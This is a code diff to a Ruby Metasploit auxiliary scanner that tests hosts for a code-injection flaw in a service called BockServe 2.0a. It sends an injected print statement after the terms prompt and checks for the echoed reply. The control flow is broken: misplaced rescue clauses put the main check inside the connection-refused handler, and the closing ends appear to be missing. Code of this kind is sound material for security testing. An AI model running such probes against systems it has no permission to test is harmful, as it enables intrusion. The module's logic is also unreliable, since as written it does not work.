@@ -1,4 +1,6 @@
 require 'msf/core'
+require 'timeout'
+require 'socket'
 
 class MetasploitModule < Msf::Auxiliary
 
@@ -16,13 +18,41 @@ def initialize
 
 end
 
-
 def run_host(ip)
 
-	timeout = 1
-	s = connect(false,{
-		'RPORT' => 3285,
-		'RHOST' => ip,
-		'ConnectTimeout' => timeout 
-		}
-	)
+	sock = connect()
+
+	rescue ::Rex::ConnectionRefused
+		vprint_status("#{ip} - No BockServe 2.0A Vulnerability")
+	
+	info = sock.recv(1024)
+
+	if(info != "Welcome to BockServe 2.0a! Please type 'yes' to agree to the terms and conditions, or 'view' to view the terms and conditions.\n") then
+		vprint_status("#{ip} - No BockServe 2.0A Vulnerability")
+	else
+		sock.puts("view")
+		info = sock.recv(1024)
+		info = sock.recv(1024)
+		sock.puts("yes")
+		sock.gets()
+		sock.puts("print(\"Vulnerable\")")
+		timeout(5) do
+        	info = sock.recv(1024)
+        	if(info == "Vulnerable") then
+        		vprint_status("#{ip} - BockServe 2.0A Vulnerability Exists")
+        	else
+        		vprint_status("#{ip} - No BockServe 2.0A Vulnerability")
+        	end
+    	end
+		rescue Timeout::Error
+    		vprint_status("#{ip} - No BockServe 2.0A Vulnerability")
+
+
+	disconnect()
+
+
+
+
+
+
+
